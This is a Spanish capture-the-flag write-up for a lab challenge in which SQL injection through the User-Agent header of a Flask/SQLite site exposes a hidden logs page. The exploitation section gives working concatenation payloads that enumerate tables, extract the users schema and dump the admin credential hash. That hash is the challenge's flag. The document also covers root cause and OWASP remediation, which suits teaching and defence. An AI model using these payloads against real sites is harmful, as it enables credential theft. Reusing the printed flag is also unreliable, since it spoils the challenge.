# Logs — Writeup

> **Aviso:** Bitácora de resolución técnica con fines 100% académicos y formativos, elaborada sobre un entorno de laboratorio deliberadamente vulnerable (HackLab — SoftwareSeguro). El objetivo es documentar la causa raíz del fallo, el proceso de explotación como prueba de concepto, y la remediación defensiva correspondiente, siguiendo el estándar OWASP.

- **Plataforma:** SoftwareSeguro (HackLab 2023)
- **ID Desafío:** 21
- **Categoría:** SQLi (SQL Injection)
- **Vulnerabilidad:** CWE-89 (SQL Injection en Headers HTTP)

---

## 1. Descripción del Desafío

Dominic está aprendiendo desarrollo web y creó un sitio de presentación personal. Para saber desde qué dispositivos lo visitan, agregó una sección "oculta" de logs en `/logs`.  
El enunciado plantea dos preguntas guía:
1. ¿Solo guarda el dispositivo de los usuarios?
2. ¿Tendrá algún usuario administrador?

---

## 2. Reconocimiento

Al acceder a la ruta `/logs`, se presenta una tabla con el histórico de visitas registradas:

| ID | Dispositivo | Fecha y hora |
|---|---|---|
| 1 | `Mozilla/5.0 (Windows NT 10.0; ...) Chrome/91...` | `2026-10-05 16:56:08` |

Se identifica que el valor almacenado en la columna **"Dispositivo"** coincide de manera exacta con el valor del encabezado HTTP `User-Agent` de cada petición entrante: el backend registra este header en la base de datos cada vez que alguien visita la página principal (`/`).

Dado que `User-Agent` es una cabecera totalmente controlada y manipulable por el cliente (sin posibilidad de validación confiable del lado del navegador), representa un **vector de entrada no confiable**, ideal para evaluar inyecciones utilizando **Burp Suite Repeater**.

---

## 3. Análisis e Identificación de la Inyección

### Paso 1 — Control Positivo
Desde Burp Repeater se modificó el header `User-Agent` en la petición `GET /` asignando un valor de prueba:
```http
User-Agent: TEST_USER_AGENT_123
```
Al revisar `/logs`, se reflejó una nueva fila con `TEST_USER_AGENT_123` exactamente como se envió, confirmando que el dato se persiste y se imprime sin filtros de sanitización.

### Paso 2 — Prueba de Comilla Simple
Se probó enviar un carácter delimitador para evaluar el manejo de sintaxis:
```http
User-Agent: test'
```
El servidor respondió con un código de estado `500 Internal Server Error` (página de error genérica de Flask, sin trazas verbosas de depuración expuestas).  
Esta respuesta `500` confirma que el valor rompe la sintaxis SQL al insertarse por concatenación directa sin sanitizar ni parametrizar (**SQL Injection - CWE-89**).

---

## 4. Explotación

Al no contar con errores detallados en pantalla, se utilizó una técnica de **exfiltración basada en concatenación**, empleando el operador `||` de SQLite para incrustar subconsultas dentro del string sin romper la instrucción `INSERT` original:

```sql
' || (SELECT ...) || '
```

### Paso 1 — Confirmar el Patrón de Inyección
Se inyectó en el `User-Agent`:
```http
User-Agent: ' || (SELECT 'FUNCIONA') || '
```
El servidor respondió `200 OK` y en la tabla de `/logs` se imprimió `FUNCIONA`. Esto validó:
- La inyección dentro del `INSERT`.
- El uso del motor **SQLite** con el operador de concatenación `||`.

### Paso 2 — Listar Tablas de la Base de Datos
```http
User-Agent: ' || (SELECT group_concat(name) FROM sqlite_master WHERE type='table') || '
```
**Resultado reflejado en `/logs`:**
```text
logs,sqlite_sequence,users
```
Se confirma la existencia de una tabla sensible llamada `users`.

### Paso 3 — Extraer el Esquema de la Tabla `users`
```http
User-Agent: ' || (SELECT sql FROM sqlite_master WHERE name='users') || '
```
**Resultado:**
```sql
CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT)
```

### Paso 4 — Extraer Credenciales de Usuarios
```http
User-Agent: ' || (SELECT group_concat(username || ':' || password) FROM users) || '
```
**Resultado:**
```text
admin:7c16e2dead8630673e7b1cb8570fe32a
```

- **Usuario:** `admin`
- **Flag / Contraseña:** `7c16e2dead8630673e7b1cb8570fe32a`

---

## 5. Modelado de Amenazas — Causa Raíz

- **Vector de entrada no confiable:** El header HTTP `User-Agent` es generado por el cliente y nunca debe considerarse de confianza.
- **Causa raíz:** Concatenación directa del input dentro de una consulta estructurada:
  ```python
  # Implementación vulnerable
  cursor.execute(f"INSERT INTO logs (dispositivo) VALUES ('{user_agent}')")
  ```
  Esto permite alterar la lógica y ejecutar subconsultas arbitrarias con acceso a tablas ajenas como `users`.
- **Ausencia de trazas detalladas:** Si bien el servidor no exponía mensajes de depuración verbosos, no fue impedimento para la exfiltración directa de datos debido al canal de salida en `/logs`.

---

## 6. Remediación Defensiva (OWASP)

1. **Sentencias Preparadas / Consultas Parametrizadas:**  
   Implementar consultas parametrizadas para cualquier entrada externa, incluyendo encabezados HTTP:
   ```python
   cursor.execute(
       "INSERT INTO logs (dispositivo) VALUES (?)",
       (request.headers.get("User-Agent"),)
   )
   ```
   *Referencia:* [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).

2. **Principio de Mínimo Privilegio en Base de Datos:**  
   El usuario de conexión utilizado por el módulo de registro de visitas no debe poseer permisos de lectura sobre tablas críticas (`users`).

3. **Almacenamiento Seguro de Contraseñas:**  
   El valor extraído corresponde a un hash MD5 (32 caracteres hexadecimales). MD5 es obsoleto y vulnerable a colisiones y ataques mediante tablas arcoíris (*rainbow tables*). Se debe utilizar un algoritmo adaptativo con *salt* automático como **Argon2id**, **bcrypt** o **PBKDF2**.

4. **Manejo Centralizado de Errores:**  
   Mantener desactivado el modo de depuración (`debug=False`) en entornos de producción.

---

## 7. Herramientas Utilizadas

- **Burp Suite Community Edition** (Interceptación y repetición de peticiones en Repeater con cabeceras modificadas).
- **Navegador Web / DevTools** (Visualización y verificación de datos exfiltrados en `/logs`).

---

## 8. Referencias

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
